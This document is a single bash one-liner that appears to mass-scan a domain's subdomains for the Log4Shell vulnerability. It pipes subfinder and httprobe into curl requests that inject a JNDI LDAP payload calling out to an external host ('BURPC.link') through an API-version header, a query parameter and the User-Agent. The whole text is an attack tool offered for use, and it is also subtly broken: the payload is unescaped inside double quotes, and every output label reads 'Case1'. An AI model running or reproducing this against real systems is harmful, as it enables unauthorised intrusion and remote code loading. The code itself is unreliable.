subfinder -d domain.com -silent |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://BURPC.link/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://BURPC.link/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://BURPC.link/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done
